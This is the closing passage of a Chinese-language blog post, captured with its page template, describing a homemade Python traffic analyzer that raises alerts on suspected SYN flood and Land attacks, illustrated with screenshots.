+<h5 id="（3）Synflood攻击"><a href="#（3）Synflood攻击" class="headerlink" title="（3）Synflood攻击"></a>（3）Synflood攻击</h5><p>Synflood攻击中，大量虚假ip向主机发送大量连续的syn包，可以判断为synflood攻击。</p>
+<h4 id="6-3-5实时分析与报警"><a href="#6-3-5实时分析与报警" class="headerlink" title="6.3.5实时分析与报警"></a>6.3.5实时分析与报警</h4><h5 id="（1）land攻击-1"><a href="#（1）land攻击-1" class="headerlink" title="（1）land攻击"></a>（1）land攻击</h5><p>运行land攻击的程序，发送源地址和目的地址相同的数据包，协议分析器会弹出弹窗“数据包源地址和目的地址相同，疑为Land攻击”。</p>
+<p><img src="https://raw.githubusercontent.com/Amy-CCC098/pic_store/master/wps8.jpg" alt="img"> </p>
+<h5 id="（2）Synflood攻击"><a href="#（2）Synflood攻击" class="headerlink" title="（2）Synflood攻击"></a>（2）Synflood攻击</h5><p>运行synflood.py程序，由不同的虚假地址不断且大量向主机发送大量syn包，协议分析器会弹出弹窗“大量虚假ip向本机发送数据包，疑为synflood攻击”。</p>
+<p><img src="https://raw.githubusercontent.com/Amy-CCC098/pic_store/master/wps9.jpg" alt="img"> </p>
+<p><img src="https://raw.githubusercontent.com/Amy-CCC098/pic_store/master/wps10.jpg" alt="img"> </p>
+
+      
+     
+   </div>
+    <footer class="article-footer">
+      <a data-url="https://amy-ccc098.github.io/2022/07/19/%E3%80%90python%E3%80%91%E4%BB%BFwireshark%E6%B5%81%E9%87%8F%E9%A2%84%E8%AD%A6%E7%B3%BB%E7%BB%9F/%E3%80%90python%E3%80%91%E4%BB%BFwireshark%E6%B5%81%E9%87%8F%E9%A2%84%E8%AD%A6%E7%B3%BB%E7%BB%9F/" data-id="cl5rk0bbv000mkovsddquanew" class="article-share-link">Share</a>
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/python/" rel="tag">python</a></li></ul>
+
+    </footer>
+  </div>
+  
+    
+<nav id="article-nav">
+  
+  
+    <a href="/2022/05/21/JMeter%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/JMeter%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/" id="article-nav-older" class="article-nav-link-wrap">
+      <strong class="article-nav-caption">Older</strong>
+      <div class="article-nav-title">JMeter工具使用</div>
+    </a>
+  
+</nav>
+
+  
+</article>
+
+</section>
+        
+          <aside id="sidebar">
+  
+    
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">标签</h3>
+    <div class="widget">
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/cisp/" rel="tag">cisp</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/kali/" rel="tag">kali</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/memo/" rel="tag">memo</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/study/" rel="tag">study</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tools/" rel="tag">tools</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/%E5%B7%A5%E6%8E%A7/" rel="tag">工控</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">归档</h3>
+    <div class="widget">
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">七月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/05/">五月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/04/">四月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/03/">三月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/02/">二月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/01/">一月 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/12/">十二月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/11/">十一月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/10/">十月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/05/">五月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/03/">三月 2021</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2021/01/">一月 2021</a></li></ul>
+    </div>
+  </div>
+
+
+  
+    
+  <div class="widget-wrap">
+    <h3 class="widget-title">最新文章</h3>
+    <div class="widget">
+      <ul>
+        
+          <li>
+            <a href="/2022/07/19/%E3%80%90python%E3%80%91%E4%BB%BFwireshark%E6%B5%81%E9%87%8F%E9%A2%84%E8%AD%A6%E7%B3%BB%E7%BB%9F/%E3%80%90python%E3%80%91%E4%BB%BFwireshark%E6%B5%81%E9%87%8F%E9%A2%84%E8%AD%A6%E7%B3%BB%E7%BB%9F/">【python】仿wireshark流量预警系统</a>
+          </li>
+        
+          <li>
+            <a href="/2022/05/21/JMeter%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/JMeter%E5%B7%A5%E5%85%B7%E4%BD%BF%E7%94%A8/">JMeter工具使用</a>
+          </li>
+        
+          <li>
+            <a href="/2022/05/07/%E3%80%90kali%E3%80%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/%E3%80%90kali%E3%80%91%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/">【kali】信息搜集</a>
+          </li>
+        
+          <li>
+            <a href="/2022/04/17/%E3%80%90%E5%B7%A5%E6%8E%A7%E3%80%91%E9%94%AE%E7%9B%98%E9%92%A9%E5%AD%90/%E3%80%90%E5%B7%A5%E6%8E%A7%E3%80%91%E9%94%AE%E7%9B%98%E9%92%A9%E5%AD%90/">【工控】键盘钩子</a>
+          </li>
+        
+          <li>
+            <a href="/2022/04/15/%E3%80%90%E5%B7%A5%E6%8E%A7%E3%80%91%E5%90%8E%E9%97%A8%E5%BC%80%E5%8F%91/%E3%80%90%E5%B7%A5%E6%8E%A7%E3%80%91%E5%90%8E%E9%97%A8%E5%BC%80%E5%8F%91/">【工控】后门开发</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+
+  
+</aside>
+        
+      </div>
+      <footer id="footer">
+  
+  <div class="outer">
+    <div id="footer-info" class="inner">
+      &copy; 2022 CAIMI<br>
+      Powered by <a href="http://hexo.io/" target="_blank">Hexo</a>
+    </div>
+  </div>
+</footer>
+    </div>
+    <nav id="mobile-nav">
+  
+    <a href="/" class="mobile-nav-link">Home</a>
+  
+    <a href="/archives" class="mobile-nav-link">Archives</a>
+  
+</nav>
+    
+
+<script src="//ajax.googleapis.com/ajax/libs/jquery/2.0.3/jquery.min.js"></script>
+
+
+  
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css">
+
+  
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+
+
+
+
+<script src="/js/script.js"></script>
+
+
+
+
+  </div>
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginModelPath":"assets/","model":{"jsonPath":"/live2dw/assets/hijiki.model.json"},"display":{"position":"right","width":250,"height":400},"mobile":{"show":true},"log":false,"pluginJsPath":"lib/","pluginRootPath":"live2dw/","tagMode":false});</script></body>
+</html>
